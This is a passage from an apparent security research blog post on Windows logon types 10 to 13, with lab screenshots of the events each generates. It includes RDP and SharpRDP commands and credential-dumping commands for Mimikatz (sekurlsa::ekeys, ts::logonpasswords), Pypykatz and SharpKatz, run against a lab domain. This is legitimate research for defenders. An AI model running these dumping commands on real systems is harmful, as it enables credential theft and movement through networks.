![](https://static.wixstatic.com/media/8b80b6_43f8f4313e9a4e48b859123bef3d494d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

RemoteInteractive Logon via mstsc

We can see in the below screenshot that the Logon Type 10 event gets generated when we logon via RDP.

![](https://static.wixstatic.com/media/8b80b6_ca282922e1b74215b5cdc517c1710d07~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

RemoteInteractive Logon Event

To use xfreerdp from a Linux machine, we need to install the xfreerdp tool. We will be using Kali Linux for our demo.

```
sudo apt-get install freerdp-x11

```

Once we install xfreerdp, we can gain RDP access to the remote machine using the following command:

```
xfreerdp /u:student66 /d:dollarcorp.moneycorp.local /p:Esxxxxxxxxxxx /v:172.16.100.66

```

![](https://static.wixstatic.com/media/8b80b6_c0052d97687244db9ddfb08e05904cfd~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

RemoteInteractive Logon via xfreerdp

Once we authenticate to the remote machine using xfreerdp, we can see the below screenshot that it has generated Logon Type 10 event.

![](https://static.wixstatic.com/media/8b80b6_696a12a76c824447bb565e8749559014~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

RemoteInteractive Logon Event

Now, let's use SharpRDP to connect to the remote machine. We can use the following command to execute the calculator on the remote machine.

```
.\SharpRDP.exe computer username=dcorp\student66 password=Esvxxxxxx

```

![](https://static.wixstatic.com/media/8b80b6_6ac42bfcca174f7fb8fbcc9a3f6ee0ee~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using SharpRDP

![](https://static.wixstatic.com/media/8b80b6_292e65cd64454b85996e313b618b8360~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using SharpRDP

In the above screenshot, we can see that the SharpRDP has spawned the calculator application on the remote machine. We can see in the below screenshot that it has generated a Logon Type 10 event.

![](https://static.wixstatic.com/media/8b80b6_c4d51f5f34214ef2af330c08d94e13ff~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

RemoteInteractive Logon Event

Now, let’s see if we can extract the credentials from the memory.

We will use [Mimikatz](https://github.com/gentilkiwi/mimikatz), Pypykatz, and [Sharpkatz](https://github.com/b4rtik/SharpKatz).

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_96e97ce993cd4c519e9ec710681b3002~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) also contains an additional terminal service module that can help us to extract the credentials in cleartext from an RDP logon.

```
privilege::debug
ts::logonpasswords

```

![](https://static.wixstatic.com/media/8b80b6_4fc32f7b998d43f2afc94f368e74b2be~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_e7e88dc4901f495099a6a170a0bfcdd7~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_7409675687dc4dbe9e15da0db0ab337b~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

### **Logon Type 11 : CachedInteractive**

Logon Type 11 event is generated when a user login to the machine via console and the credentials are validated through cached credentials means either the user is not connected to the organizational network or the domain controller is not reachable. Windows support logon using cached credentials for roaming users to make their life easy when they are disconnected from the organizational network.

For our demonstration, we have modified the DNS setting on the machine and tried to logon to the machine so that the machine validates the credentials from the cache instead of a domain controller. We can see in the below screenshot that it has generated a Logon Type 11 event.

![](https://static.wixstatic.com/media/8b80b6_372f4a126c49447face0a1b4d6835ecf~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

CachedInteractive Logon Event

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_fa8496de14fa4a09aa2eb3677e2a9907~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_489395dcd3d14acaae264ddde0fc0858~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_d8d40a06638e4b408effb1dbd0b4e2e7~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

### **Logon Type 12 : CachedRemoteInteractive**

Logon Type 12 event is generated when a user login to the machine remotely via RDP (using Remote Desktop or Terminal Service or Remote Assistance) and the credentials are validated through cached credentials means either the user is not connected to the organizational network or the domain controller is not reachable. Windows support logon using cached credentials for roaming users to make their life easy when they are disconnected from the organizational network.

For our demonstration, we have modified the DNS setting on the machine and tried to logon to the machine so that the machine validates the credentials from the cache instead of a domain controller. We can see in the below screenshot that it has generated a Logon Type 12 event.

![](https://static.wixstatic.com/media/8b80b6_88619ca2f122403aa989ee7c4b89993f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

CachedRemoteInteractive Logon Event

Note: We were not able to extract the credentials for the CachedRemoteInteractive logon type.

### **Logon Type 13 : CachedUnlocked**

Logon Type 13 event is generated when a user tries to unlock a locked machine and the credentials are validated through cached credentials means either the user is not connected to the organizational network or the domain controller is not reachable. Windows support logon using cached credentials for roaming users to make their life easy when they are disconnected from the organizational network.

Note: We were not able to replicate the event in our lab.

### **References**

[https://www.ultimatewindowssecurity.com/securitylog/book/page.aspx?spid=chapter3](https://www.ultimatewindowssecurity.com/securitylog/book/page.aspx?spid=chapter3)

[https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)

[https://eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)

[https://www.itprotoday.com/security/q-what-are-different-windows-logon-types-can-show-windows-event-log](https://www.itprotoday.com/security/q-what-are-different-windows-logon-types-can-show-windows-event-log)

[https://twitter.com/SteveSyfuhs/status/1297957799079510018](https://twitter.com/SteveSyfuhs/status/1297957799079510018)

[https://twitter.com/jepaynemsft/status/1012815189345857536](https://twitter.com/jepaynemsft/status/1012815189345857536)

Feel free to provide me the feedback on twitter [@chiragsavla94](https://twitter.com/chiragsavla94)

Thanks for reading the post.

Special thanks to all my friends who help / supported / motivated me for writing blogs. 🙏

Posted by:

Chirag Savla

Senior Security Researcher at AlteredSecurity

Co-Author:

Anas Jamal

Interned at AlteredSecurity